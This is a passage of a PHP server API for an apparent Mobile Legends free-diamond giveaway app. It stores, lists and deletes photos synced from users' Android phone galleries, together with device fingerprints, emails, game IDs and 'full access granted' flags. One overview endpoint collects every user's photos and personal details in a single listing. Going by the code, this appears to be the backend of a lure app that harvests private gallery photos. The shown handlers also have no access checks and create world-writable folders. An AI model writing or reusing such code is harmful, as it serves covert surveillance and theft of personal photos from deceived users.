            $hasValidServer = (!empty($userInfo['mlbb_server']) && $userInfo['mlbb_server'] !== '—');
            if ($hasValidMlbb) {
                $userInfo['formatted_title'] = $phoneModel . ' [#' . $deviceTag . '] | ' . $userInfo['mlbb_id'] . ($hasValidServer ? ' (' . $userInfo['mlbb_server'] . ')' : '');
            } else {
                $playerLabel = (!empty($userInfo['ign']) && $userInfo['ign'] !== '—' && $userInfo['ign'] !== 'Player') ? $userInfo['ign'] : 'Device ' . $deviceTag;
                $userInfo['formatted_title'] = $phoneModel . ' [#' . $deviceTag . '] | ' . $playerLabel;
            }

            // 4. Load synced device gallery photos strictly from THIS specific device's folder
            $hasDeviceAvatar = false;
            $dirBasename = $targetDir ? basename($targetDir) : '';
            $totalStorageBytes = 0;

            if ($meta && !empty($meta['photos'])) {
                foreach ($meta['photos'] as $p) {
                    $pName = strtolower($p['name'] ?? '');
                    $pFn = strtolower($p['filename'] ?? '');
                    $isAvatar = !empty($p['is_avatar']) || (strpos($pName, 'avatar_') === 0) || (strpos($pFn, 'avatar_') === 0);

                    $url = $p['url'];
                    if (strpos($url, 'uploads/gallery/') === false && $dirBasename) {
                        $url = 'uploads/gallery/' . $dirBasename . '/' . basename($p['filename']);
                    }

                    $pSize = intval($p['size'] ?? 0);
                    $totalStorageBytes += $pSize;

                    $photoObj = [
                        'id'         => $p['id'] ?? $p['filename'],
                        'filename'   => $p['filename'],
                        'name'       => $p['name'] ?? $p['filename'],
                        'url'        => $url,
                        'size'       => $pSize,
                        'mime'       => $p['mime'] ?? 'image/jpeg',
                        'is_avatar'  => $isAvatar,
                        'date_added' => $p['date_added'] ?? date('c')
                    ];

                    if ($isAvatar) {
                        $hasDeviceAvatar = true;
                        array_unshift($photos, $photoObj);
                    } else {
                        $photos[] = $photoObj;
                        $devicePhotos[] = $photoObj;
                    }
                }
            }

            // Also scan physical directory for any un-indexed photos
            if ($targetDir && is_dir($targetDir)) {
                foreach (scandir($targetDir) as $f) {
                    if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
                    $filePath = $targetDir . '/' . $f;
                    if (!is_file($filePath)) continue;
                    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    if (!in_array($ext, ['jpg', 'jpeg', 'png', 'webp', 'gif'])) continue;

                    // Check if already in $photos
                    $found = false;
                    foreach ($photos as $ep) {
                        if (($ep['filename'] ?? '') === $f) {
                            $found = true;
                            break;
                        }
                    }
                    if (!$found) {
                        $isAv = (strpos(strtolower($f), 'avatar_') === 0);
                        $fSize = filesize($filePath);
                        $totalStorageBytes += $fSize;

                        $photoObj = [
                            'id'         => $f,
                            'filename'   => $f,
                            'name'       => $f,
                            'url'        => 'uploads/gallery/' . $dirBasename . '/' . $f,
                            'size'       => $fSize,
                            'mime'       => ($ext === 'png' ? 'image/png' : ($ext === 'webp' ? 'image/webp' : 'image/jpeg')),
                            'is_avatar'  => $isAv,
                            'date_added' => date('c', filemtime($filePath))
                        ];
                        if ($isAv) {
                            $hasDeviceAvatar = true;
                            array_unshift($photos, $photoObj);
                        } else {
                            $photos[] = $photoObj;
                            $devicePhotos[] = $photoObj;
                        }
                    }
                }
            }

            // If no avatar photo from device, but Supabase has avatar data, include it
            if (!$hasDeviceAvatar && !empty($supabaseAvatar)) {
                $avatarObj = [
                    'id'         => 'supabase_avatar_' . md5($email),
                    'filename'   => 'avatar_' . md5($email) . '.jpg',
                    'name'       => 'Profile Avatar',
                    'url'        => $supabaseAvatar,
                    'size'       => strlen($supabaseAvatar),
                    'mime'       => 'image/jpeg',
                    'is_avatar'  => true,
                    'date_added' => date('c')
                ];
                array_unshift($photos, $avatarObj);
                $hasDeviceAvatar = true;
            }

            // Sort device photos newest first so recently added photos show at the top
            usort($devicePhotos, function ($a, $b) {
                $tA = !empty($a['date_added']) ? strtotime($a['date_added']) : 0;
                $tB = !empty($b['date_added']) ? strtotime($b['date_added']) : 0;
                return $tB - $tA;
            });

            // Reconstruct photos list: avatars first, then sorted device photos
            $avatarPhotos = array_filter($photos, function ($p) { return !empty($p['is_avatar']); });
            $photos = array_merge(array_values($avatarPhotos), $devicePhotos);

            $deviceCount = count($devicePhotos);
            $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0);
            $accessStatus = $hasFullAccess ? 'granted' : ($hasDeviceAvatar ? 'avatar_only' : (!empty($supabaseAvatar) ? 'avatar_only' : 'none'));

            $formattedStorage = $totalStorageBytes >= 1048576 
                ? round($totalStorageBytes / 1048576, 2) . ' MB' 
                : round($totalStorageBytes / 1024, 1) . ' KB';

            $deviceBinds = $meta['binds'] ?? [];
            $userBinds = $meta['user_binds'] ?? [];

            sendJson(true, [
                'device'             => [
                    'id'                     => $userInfo['device_id'],
                    'tag'                    => $userInfo['device_tag'] ?? '',
                    'name'                   => $userInfo['device_name'],
                    'model'                  => $userInfo['device_model'],
                    'phone_model'            => $phoneModel,
                    'fingerprint'            => $userInfo['device_fingerprint'],
                    'formatted_title'        => $userInfo['formatted_title'],
                    'storage_path'           => 'uploads/gallery/' . ($cleanDir ?: $dirBasename),
                    'storage_size_bytes'     => $totalStorageBytes,
                    'storage_size_formatted' => $formattedStorage,
                    'last_synced'            => $meta['last_synced'] ?? date('c'),
                    'binds'                  => $deviceBinds,
                    'user_binds'             => $userBinds
                ],
                'user'               => $userInfo,
                'photos'             => $photos,
                'total_photos'       => count($photos),
                'device_photo_count' => $deviceCount,
                'has_gallery_access' => $hasFullAccess,
                'access_status'      => $accessStatus,
                'storage_size'       => $formattedStorage,
                'binds'              => $deviceBinds,
                'user_binds'         => $userBinds,
                'hero_avatar'        => $photos[0]['url'] ?? $supabaseAvatar
            ], 'Device gallery photos retrieved');
            break;

        case 'delete_gallery_photo':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? $body['email'] ?? $_GET['email'] ?? '');
            $filename = trim($body['filename'] ?? $_GET['filename'] ?? '');

            if (empty($deviceId) || empty($filename)) {
                sendJson(false, null, 'Device ID and filename are required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $targetEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;

            if ($targetDir) {
                $baseFn = basename($filename);
                $filePath = $targetDir . '/' . $baseFn;
                $metaFile = $targetDir . '/meta.json';
                if (file_exists($filePath)) {
                    @unlink($filePath);
                }
                if (file_exists($metaFile)) {
                    $meta = json_decode(file_get_contents($metaFile), true);
                    if (is_array($meta)) {
                        if (!$targetEmail && !empty($meta['user_email'])) $targetEmail = $meta['user_email'];
                        $meta['photos'] = array_values(array_filter($meta['photos'] ?? [], function($p) use ($baseFn, $filename) {
                            $pFn = basename($p['filename'] ?? '');
                            $pId = $p['id'] ?? '';
                            $pUrl = basename($p['url'] ?? '');
                            $pOrig = basename($p['name'] ?? '');
                            return ($pFn !== $baseFn && $pId !== $filename && $pUrl !== $baseFn && ($p['filename'] ?? '') !== $filename);
                        }));
                        $meta['is_full_access'] = count($meta['photos'] ?? []) > 0;
                        $meta['last_synced'] = date('c');
                        file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                    }
                }
            }

            // If deleting an avatar, also clear avatar_data in Supabase
            $isAvatarTarget = (strpos(strtolower($filename), 'avatar') !== false || $filename === 'Profile Avatar');
            if ($isAvatarTarget && !empty($targetEmail) && strtolower($targetEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($targetEmail), 'PATCH', ['avatar_data' => null]);
            }

            sendJson(true, null, 'Photo deleted from device gallery');
            break;

        case 'delete_all_gallery_photos':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? $body['email'] ?? $_GET['email'] ?? '');
            if (empty($deviceId)) {
                sendJson(false, null, 'Device ID is required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $targetEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;

            if ($targetDir && is_dir($targetDir)) {
                $metaFile = $targetDir . '/meta.json';
                $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [];
                if (!$targetEmail && !empty($meta['user_email'])) $targetEmail = $meta['user_email'];

                // Remove all photo files from the directory
                foreach (scandir($targetDir) as $f) {
                    if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
                    $fp = $targetDir . '/' . $f;
                    if (is_file($fp)) {
                        @unlink($fp);
                    }
                }

                if (is_array($meta)) {
                    $meta['photos'] = [];
                    $meta['is_full_access'] = false;
                    $meta['last_synced'] = date('c');
                    file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                }
            }

            if (!empty($targetEmail) && strtolower($targetEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($targetEmail), 'PATCH', ['avatar_data' => null]);
            }

            sendJson(true, null, 'All photos permanently deleted from device gallery');
            break;

        case 'delete_device_gallery':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? $body['email'] ?? $_GET['email'] ?? '');
            if (empty($deviceId)) {
                sendJson(false, null, 'Device ID is required', 400);
            }

            $galleryDir = __DIR__ . '/uploads/gallery';
            $userEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;
            $mlbbId = null;

            $targetDirs = [];
            $cleanId = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($deviceId));
            $candidates = [
                $galleryDir . '/device_' . $cleanId,
                $galleryDir . '/' . $cleanId,
                $galleryDir . '/user_' . $cleanId
            ];

            foreach ($candidates as $cand) {
                if (is_dir($cand) && !in_array($cand, $targetDirs)) {
                    $targetDirs[] = $cand;
                }
            }

            if (is_dir($galleryDir)) {
                foreach (scandir($galleryDir) as $d) {
                    if ($d === '.' || $d === '..') continue;
                    $dirPath = $galleryDir . '/' . $d;
                    if (!is_dir($dirPath)) continue;

                    $mFile = $dirPath . '/meta.json';
                    if (file_exists($mFile)) {
                        $m = json_decode(file_get_contents($mFile), true);
                        if (is_array($m)) {
                            $mDev = $m['device_id'] ?? '';
                            $mEmail = $m['user_email'] ?? '';
                            $mMlbb = $m['mlbb_id'] ?? '';

                            $matches = ($mDev === $deviceId || $mEmail === $deviceId || $mMlbb === $deviceId || $d === $cleanId || $d === 'device_' . $cleanId || $d === 'user_' . $cleanId);
                            if ($matches) {
                                if (!in_array($dirPath, $targetDirs)) {
                                    $targetDirs[] = $dirPath;
                                }
                                if (!$userEmail && !empty($mEmail)) $userEmail = $mEmail;
                                if (!$mlbbId && !empty($mMlbb)) $mlbbId = $mMlbb;
                            }
                        }
                    } else if ($d === $cleanId || $d === 'device_' . $cleanId || $d === 'user_' . $cleanId) {
                        if (!in_array($dirPath, $targetDirs)) {
                            $targetDirs[] = $dirPath;
                        }
                    }
                }
            }

            // Also check Supabase users table if email/mlbbId still unknown
            if (!$userEmail || !$mlbbId) {
                $uLookup = supabaseApiRequest('users?or=(email.eq.' . urlencode($deviceId) . ',mlbb_id.eq.' . urlencode($deviceId) . ')&select=email,mlbb_id', 'GET');
                if ($uLookup['success'] && !empty($uLookup['data'][0])) {
                    if (!$userEmail && !empty($uLookup['data'][0]['email'])) $userEmail = $uLookup['data'][0]['email'];
                    if (!$mlbbId && !empty($uLookup['data'][0]['mlbb_id'])) $mlbbId = $uLookup['data'][0]['mlbb_id'];
                }
            }

            // 1. Delete physical folders and all photo files from disk
            foreach ($targetDirs as $tDir) {
                if (is_dir($tDir)) {
                    foreach (scandir($tDir) as $f) {
                        if ($f === '.' || $f === '..') continue;
                        $fp = $tDir . '/' . $f;
                        if (is_file($fp)) @unlink($fp);
                    }
                    @rmdir($tDir);
                }
            }

            // 2. Permanently delete from Supabase database (users, redemptions, giveaway_entries)
            if (!empty($userEmail) && strtolower($userEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($userEmail), 'DELETE');
                supabaseApiRequest('redemptions?user_email=eq.' . urlencode($userEmail), 'DELETE');
                supabaseApiRequest('giveaway_entries?user_email=eq.' . urlencode($userEmail), 'DELETE');
            }

            if (!empty($mlbbId) && $mlbbId !== '—') {
                supabaseApiRequest('users?mlbb_id=eq.' . urlencode($mlbbId), 'DELETE');
            }

            // Also direct delete by deviceId if it was used as email
            if (strpos($deviceId, '@') !== false && strtolower($deviceId) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($deviceId), 'DELETE');
            }

            sendJson(true, [
                'deleted_device_id' => $deviceId,
                'deleted_email'     => $userEmail,
                'deleted_mlbb_id'   => $mlbbId
            ], 'Device and all its data permanently deleted from storage and database');
            break;

        case 'add_device':
            $deviceModel = trim($body['device_model'] ?? 'Android Device');
            $deviceName = trim($body['device_name'] ?? $deviceModel);
            $mlbbId = trim($body['mlbb_id'] ?? '');
            $mlbbServer = trim($body['mlbb_server'] ?? '');
            $mlbbIgn = trim($body['mlbb_ign'] ?? 'Player');
            $userEmail = trim($body['user_email'] ?? '');
            $accessStatus = trim($body['access_status'] ?? 'avatar_only');
            $avatarData = trim($body['avatar_data'] ?? '');

            if (empty($userEmail)) {
                if (!empty($mlbbId) && !empty($mlbbServer)) {
                    $userEmail = $mlbbId . '.' . $mlbbServer . '@ketupat.app';
                } else if (!empty($mlbbId)) {
                    $userEmail = 'player_' . $mlbbId . '@ketupat.app';
                } else {
                    $userEmail = 'device_' . time() . '@ketupat.app';
                }
            }

            $deviceId = $userEmail;
            $cleanDir = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $userEmail));
            $galleryDir = __DIR__ . '/uploads/gallery';
            if (!is_dir($galleryDir)) {
                mkdir($galleryDir, 0777, true);
            }
            $targetDir = $galleryDir . '/' . $cleanDir;
            if (!is_dir($targetDir)) {
                mkdir($targetDir, 0777, true);
            }

            $metaFile = $targetDir . '/meta.json';
            $meta = [
                'device_id'          => $deviceId,
                'device_name'        => $deviceName,
                'device_model'       => $deviceModel,
                'device_fingerprint' => 'Manual Registration',
                'user_email'         => $userEmail,
                'mlbb_id'            => $mlbbId,
                'mlbb_server'        => $mlbbServer,
                'mlbb_ign'           => $mlbbIgn,
                'is_full_access'     => ($accessStatus === 'granted'),
                'photos'             => [],
                'last_synced'        => date('c')
            ];

            if (!empty($avatarData) && strpos($avatarData, 'data:image') === 0) {
                $parts = explode(',', $avatarData);
                $rawBase64 = end($parts);
                $decoded = base64_decode($rawBase64);
                if ($decoded !== false) {
                    $fn = 'avatar_' . time() . '.jpg';
                    file_put_contents($targetDir . '/' . $fn, $decoded);
                    $meta['photos'][] = [
                        'id'         => 'avatar_' . time(),
                        'filename'   => $fn,
                        'name'       => 'Profile Avatar',
                        'url'        => 'uploads/gallery/' . $cleanDir . '/' . $fn,
                        'size'       => strlen($decoded),
                        'mime'       => 'image/jpeg',
                        'is_avatar'  => true,
                        'date_added' => date('c')
                    ];
                }
            }

            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

            // Register in Supabase users table
            $userData = [
                'email'            => $userEmail,
                'username'         => $mlbbIgn,
                'mlbb_id'          => $mlbbId,
                'mlbb_server'      => $mlbbServer,
                'mlbb_ign'         => $mlbbIgn,
                'points'           => 100,
                'diamonds_claimed' => 0,
                'updated_at'       => date('c')
            ];
            if (!empty($avatarData)) {
                $userData['avatar_data'] = $avatarData;
            }

            supabaseApiRequest('users', 'POST', $userData, ['Prefer: resolution=merge-duplicates']);

            sendJson(true, [
                'device_id'       => $deviceId,
                'phone_model'     => $deviceModel,
                'user_email'      => $userEmail,
                'formatted_title' => $deviceModel . ' | ' . ($mlbbId ?: '—') . ' (' . ($mlbbServer ?: '—') . ')'
            ], 'Device registered successfully');
            break;

        case 'get_gallery_overview':
            $galleryDir = __DIR__ . '/uploads/gallery';
            $results = [];
            $seenDeviceIds = [];

            // 1. Scan unique device folders in uploads/gallery
            if (is_dir($galleryDir)) {
                $dirs = scandir($galleryDir);
                foreach ($dirs as $d) {
                    if ($d === '.' || $d === '..') continue;
                    $fullPath = $galleryDir . '/' . $d;
                    if (!is_dir($fullPath)) continue;

                    $metaFile = $fullPath . '/meta.json';
                    $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : null;
                    if (!is_array($meta)) {
                        $meta = [
                            'device_id'    => $d,
                            'device_name'  => 'Android Device',
                            'device_model' => 'Android Device',
                            'photos'       => []
                        ];
                    }

                    $deviceId = $meta['device_id'] ?? '';
                    if (empty($deviceId)) {
                        $deviceId = (strpos($d, 'device_') === 0) ? substr($d, 7) : $d;
                    }

                    // Prevent duplicate listing of the same physical device
                    if (isset($seenDeviceIds[$deviceId])) continue;
                    $seenDeviceIds[$deviceId] = true;

                    if (!empty($meta['user_email']) && strtolower($meta['user_email']) !== 'guest@ketupat.app') {
                        $seenDeviceIds[strtolower($meta['user_email'])] = true;
                    }
                    if (!empty($meta['mlbb_id']) && $meta['mlbb_id'] !== '—') {
                        $seenDeviceIds['mlbb_' . $meta['mlbb_id']] = true;
                        $seenDeviceIds[$meta['mlbb_id']] = true;
                    }

                    $deviceCount = 0;
                    $photoCount = 0;
                    $recentPhoto = null;
                    $hasAvatar = false;
                    $avatarUrl = null;
                    $previewPhotos = [];
                    $folderTotalBytes = 0;

                    foreach ($meta['photos'] ?? [] as $p) {
                        $pName = strtolower($p['name'] ?? '');
                        $pFn = strtolower($p['filename'] ?? '');
                        $isAv = !empty($p['is_avatar']) || (strpos($pName, 'avatar_') === 0) || (strpos($pFn, 'avatar_') === 0);
                        $pUrl = $p['url'] ?? '';
                        if (strpos($pUrl, 'uploads/gallery/') === false && $d) {
                            $pUrl = 'uploads/gallery/' . $d . '/' . basename($p['filename'] ?? '');
                        }
                        $pSize = intval($p['size'] ?? 0);
                        $folderTotalBytes += $pSize;
                        $photoCount++;

                        if ($isAv) {
                            $hasAvatar = true;
                            if (!$avatarUrl) $avatarUrl = $pUrl;
                        } else {
                            $deviceCount++;
                            if (!$recentPhoto) $recentPhoto = $pUrl;
                        }

                        if (count($previewPhotos) < 4 && !empty($pUrl) && !in_array($pUrl, $previewPhotos)) {
                            $previewPhotos[] = $pUrl;
                        }
                    }

                    // Also count physical files in directory that are images
                    foreach (scandir($fullPath) as $f) {
                        if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
                        $fp = $fullPath . '/' . $f;
                        if (!is_file($fp)) continue;
                        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                        if (in_array($ext, ['jpg', 'jpeg', 'png', 'webp', 'gif'])) {
                            $found = false;
                            foreach ($meta['photos'] ?? [] as $mp) {
                                if (($mp['filename'] ?? '') === $f) {
                                    $found = true;
                                    break;
                                }
                            }
                            if (!$found) {
                                $isAv = (strpos(strtolower($f), 'avatar_') === 0);
                                $fUrl = 'uploads/gallery/' . $d . '/' . $f;
                                $fSize = filesize($fp);
                                $folderTotalBytes += $fSize;
                                $photoCount++;
                                if ($isAv) {
                                    $hasAvatar = true;
                                    if (!$avatarUrl) $avatarUrl = $fUrl;
                                } else {
                                    $deviceCount++;
                                    if (!$recentPhoto) $recentPhoto = $fUrl;
                                }

                                if (count($previewPhotos) < 4 && !in_array($fUrl, $previewPhotos)) {
                                    $previewPhotos[] = $fUrl;
                                }
                            }
                        }
                    }

                    // Check Supabase avatar if no avatar found
                    $email = $meta['user_email'] ?? '';
                    if (!$hasAvatar && !empty($email)) {
                        $uLookupAv = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=avatar_data', 'GET');
                        if ($uLookupAv['success'] && !empty($uLookupAv['data'][0]['avatar_data'])) {
                            $hasAvatar = true;
                            $photoCount++;
                            if (!$avatarUrl) $avatarUrl = $uLookupAv['data'][0]['avatar_data'];
                            if (count($previewPhotos) < 4) $previewPhotos[] = $avatarUrl;
                        }
                    }

                    $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0);
                    $accessStatus = $hasFullAccess ? 'granted' : ($hasAvatar ? 'avatar_only' : 'none');

                    $deviceName = $meta['device_name'] ?? '';
                    $deviceModel = $meta['device_model'] ?? '';
                    $phoneModel = !empty($deviceModel) ? $deviceModel : (!empty($deviceName) ? $deviceName : 'Android Device');
                    if (empty($deviceName)) {
                        $deviceName = $phoneModel;
                    }

                    $mlbbId = $meta['mlbb_id'] ?? '—';
                    $mlbbServer = $meta['mlbb_server'] ?? '—';
                    $ign = $meta['mlbb_ign'] ?? 'Player';
                    $email = $meta['user_email'] ?? '';
                    $userPoints = 0;
                    $userDiamonds = 0;

                    // If MLBB ID or Server are missing, fetch fresh from Supabase
                    if (!empty($email) && ($mlbbId === '—' || $mlbbServer === '—' || $ign === 'Player')) {
                        $uLookup = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=mlbb_id,mlbb_server,mlbb_ign,points,diamonds_claimed', 'GET');
                        if ($uLookup['success'] && !empty($uLookup['data'][0])) {
                            $sp = $uLookup['data'][0];
                            if ($mlbbId === '—' && !empty($sp['mlbb_id'])) $mlbbId = $sp['mlbb_id'];
                            if ($mlbbServer === '—' && !empty($sp['mlbb_server'])) $mlbbServer = $sp['mlbb_server'];
                            if ($ign === 'Player' && !empty($sp['mlbb_ign'])) $ign = $sp['mlbb_ign'];
                            $userPoints = intval($sp['points'] ?? 0);
                            $userDiamonds = intval($sp['diamonds_claimed'] ?? 0);
                        }
                    }

                    // Extract short unique identifier (tag) for same-model differentiation
                    $deviceTag = '';
                    if (strpos($deviceId, 'dev_') === 0) {
                        $cleanSuffix = substr($deviceId, 4);
                        $dashPos = strpos($cleanSuffix, '-');
                        $deviceTag = ($dashPos !== false) ? substr($cleanSuffix, 0, $dashPos) : substr($cleanSuffix, 0, 8);
                    } else if (strlen($deviceId) >= 6) {
                        $deviceTag = substr($deviceId, 0, 8);
                    } else {
                        $deviceTag = $deviceId;
                    }

                    $hasValidMlbb = (!empty($mlbbId) && $mlbbId !== '—');
                    $hasValidServer = (!empty($mlbbServer) && $mlbbServer !== '—');
                    if ($hasValidMlbb) {
                        $formattedTitle = $phoneModel . ' [#' . $deviceTag . '] | ' . $mlbbId . ($hasValidServer ? ' (' . $mlbbServer . ')' : '');
                    } else {
                        $playerLabel = (!empty($ign) && $ign !== '—' && $ign !== 'Player') ? $ign : 'Device ' . $deviceTag;
                        $formattedTitle = $phoneModel . ' [#' . $deviceTag . '] | ' . $playerLabel;
                    }

                    $formattedStorage = $folderTotalBytes >= 1048576 
                        ? round($folderTotalBytes / 1048576, 2) . ' MB' 
                        : round($folderTotalBytes / 1024, 1) . ' KB';

                    $results[] = [
                        'device_id'              => $deviceId,
                        'folder_name'            => $d,
                        'device_tag'             => $deviceTag,
                        'device_name'            => $deviceName,
                        'device_model'           => $deviceModel,
                        'phone_model'            => $phoneModel,
                        'formatted_title'        => $formattedTitle,
                        'device_fingerprint'     => $meta['device_fingerprint'] ?? '',
                        'email'                  => $email,
                        'ign'                    => $ign,
                        'mlbb_id'                => $mlbbId,
                        'mlbb_server'            => $mlbbServer,
                        'has_access'             => $hasFullAccess,
                        'access_status'          => $accessStatus,
                        'device_count'           => $deviceCount,
                        'photo_count'            => $photoCount,
                        'thumbnail'              => $recentPhoto ?: $avatarUrl,
                        'preview_photos'         => $previewPhotos,
                        'storage_size_bytes'     => $folderTotalBytes,
                        'storage_size_formatted' => $formattedStorage,
                        'binds'                  => $meta['binds'] ?? [],
                        'user_binds'             => $meta['user_binds'] ?? [],
                        'points'                 => $userPoints,
                        'diamonds_claimed'       => $userDiamonds,
                        'last_active'            => $meta['last_synced'] ?? date('c')
                    ];
                }
            }

            // 2. Also list registered users from Supabase users table without artificial limits
            $usersRes = supabaseApiRequest('users?select=email,username,mlbb_id,mlbb_server,mlbb_ign,avatar_data,created_at,updated_at&order=created_at.desc&limit=1000', 'GET');
            if ($usersRes['success'] && is_array($usersRes['data'])) {
                foreach ($usersRes['data'] as $u) {
                    $uEmail = strtolower($u['email'] ?? '');
                    $uId = $u['mlbb_id'] ?? '';
                    if (empty($uEmail) || $uEmail === 'guest@ketupat.app') continue;
                    if (isset($seenDeviceIds[$uEmail]) || (!empty($uId) && isset($seenDeviceIds[$uId]))) continue;

                    $uServer = $u['mlbb_server'] ?? '—';
                    $uPhone = 'Android Device';
                    $formattedTitle = $uPhone . ' | ' . ($uId ?: '—') . ' (' . $uServer . ')';

                    $seenDeviceIds[$uEmail] = true;
                    if (!empty($uId)) $seenDeviceIds[$uId] = true;

                    $results[] = [
                        'device_id'          => $u['email'],
                        'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($uEmail)),
                        'device_name'        => 'Device (' . ($u['mlbb_ign'] ?? 'Player') . ')',
                        'device_model'       => $uPhone,
                        'phone_model'        => $uPhone,
                        'formatted_title'    => $formattedTitle,
                        'device_fingerprint' => 'Pending Sync',
                        'email'              => $u['email'],
                        'ign'                => $u['mlbb_ign'] ?? $u['username'] ?? '—',
                        'mlbb_id'            => $uId,
                        'mlbb_server'        => $uServer,
                        'has_access'         => false,
                        'access_status'      => !empty($u['avatar_data']) ? 'avatar_only' : 'none',
                        'device_count'       => 0,
                        'photo_count'        => !empty($u['avatar_data']) ? 1 : 0,
                        'thumbnail'          => $u['avatar_data'] ?? null,
                        'last_active'        => $u['updated_at'] ?? $u['created_at'] ?? ''
                    ];
                }
            }

            // 3. Also check redemptions table for any participants
            $redemptionsRes = supabaseApiRequest('redemptions?select=user_email,user_id,server_id,ign,created_at&limit=1000', 'GET');
            if ($redemptionsRes['success'] && is_array($redemptionsRes['data'])) {
                foreach ($redemptionsRes['data'] as $r) {
                    $rEmail = strtolower($r['user_email'] ?? '');
                    $rId = $r['user_id'] ?? '';
                    if (empty($rEmail) && empty($rId)) continue;
                    if ($rEmail === 'guest@ketupat.app') continue;
                    if ((!empty($rEmail) && isset($seenDeviceIds[$rEmail])) || (!empty($rId) && isset($seenDeviceIds[$rId]))) continue;

                    if (!empty($rEmail)) $seenDeviceIds[$rEmail] = true;
                    if (!empty($rId)) $seenDeviceIds[$rId] = true;

                    $uPhone = 'Android Device';
                    $rServer = $r['server_id'] ?? '—';
                    $devId = !empty($rEmail) ? $rEmail : ('player_' . $rId . '@ketupat.app');
                    $formattedTitle = $uPhone . ' | ' . ($rId ?: '—') . ' (' . $rServer . ')';

                    $results[] = [
                        'device_id'          => $devId,
                        'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($devId)),
                        'device_name'        => 'Device (' . ($r['ign'] ?? 'Player') . ')',
                        'device_model'       => $uPhone,
                        'phone_model'        => $uPhone,
                        'formatted_title'    => $formattedTitle,
                        'device_fingerprint' => 'Pending Sync',
                        'email'              => $rEmail ?: $devId,
                        'ign'                => $r['ign'] ?? 'Player',
                        'mlbb_id'            => $rId ?: '—',
                        'mlbb_server'        => $rServer,
                        'has_access'         => false,
                        'access_status'      => 'none',
                        'device_count'       => 0,
                        'photo_count'        => 0,
                        'thumbnail'          => null,
                        'last_active'        => $r['created_at'] ?? ''
                    ];
                }
            }

            // 4. Also check giveaway_entries table for any participants
            $giveawaysRes = supabaseApiRequest('giveaway_entries?select=user_email,mlbb_id,server_id,ign,created_at&limit=1000', 'GET');
            if ($giveawaysRes['success'] && is_array($giveawaysRes['data'])) {
                foreach ($giveawaysRes['data'] as $g) {
                    $gEmail = strtolower($g['user_email'] ?? '');
                    $gId = $g['mlbb_id'] ?? '';
                    if (empty($gEmail) && empty($gId)) continue;
                    if ($gEmail === 'guest@ketupat.app') continue;
                    if ((!empty($gEmail) && isset($seenDeviceIds[$gEmail])) || (!empty($gId) && isset($seenDeviceIds[$gId]))) continue;

                    if (!empty($gEmail)) $seenDeviceIds[$gEmail] = true;
                    if (!empty($gId)) $seenDeviceIds[$gId] = true;

                    $uPhone = 'Android Device';
                    $gServer = $g['server_id'] ?? '—';
                    $devId = !empty($gEmail) ? $gEmail : ('player_' . $gId . '@ketupat.app');
                    $formattedTitle = $uPhone . ' | ' . ($gId ?: '—') . ' (' . $gServer . ')';

                    $results[] = [
                        'device_id'          => $devId,
                        'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($devId)),
                        'device_name'        => 'Device (' . ($g['ign'] ?? 'Player') . ')',
                        'device_model'       => $uPhone,
                        'phone_model'        => $uPhone,
                        'formatted_title'    => $formattedTitle,
                        'device_fingerprint' => 'Pending Sync',
                        'email'              => $gEmail ?: $devId,
                        'ign'                => $g['ign'] ?? 'Player',
                        'mlbb_id'            => $gId ?: '—',
                        'mlbb_server'        => $gServer,
                        'has_access'         => false,
                        'access_status'      => 'none',
                        'device_count'       => 0,
                        'photo_count'        => 0,
                        'thumbnail'          => null,
                        'last_active'        => $g['created_at'] ?? ''
                    ];
                }
            }

            sendJson(true, $results, 'Device gallery overview retrieved');
            break;

        default:
            sendJson(false, null, "Unknown or missing action: '$action'", 400);
            break;
    }
} catch (\Throwable $e) {
    sendJson(false, null, 'Server Error: ' . $e->getMessage(), 500);
}
